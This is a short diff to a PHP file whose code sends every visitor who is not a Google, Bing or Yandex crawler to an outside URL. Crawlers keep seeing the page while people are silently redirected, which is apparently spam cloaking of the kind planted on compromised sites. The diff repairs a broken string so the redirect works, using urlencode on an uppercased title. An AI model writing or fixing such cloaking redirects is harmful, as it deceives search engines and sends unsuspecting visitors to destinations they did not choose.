@@ -4,7 +4,7 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
 
     // (case-insensitive)
     if (!preg_match('/google|bing|yandex/i', $user_agent)) {
-        header('Location: https://www.sookeregionchamber.com/gotopage/?page=<?php echo strtoupper($title); ?>');
+        header('Location: https://www.sookeregionchamber.com/gotopage/?page=' . urlencode(strtoupper($title)));
         exit;
     }
 }
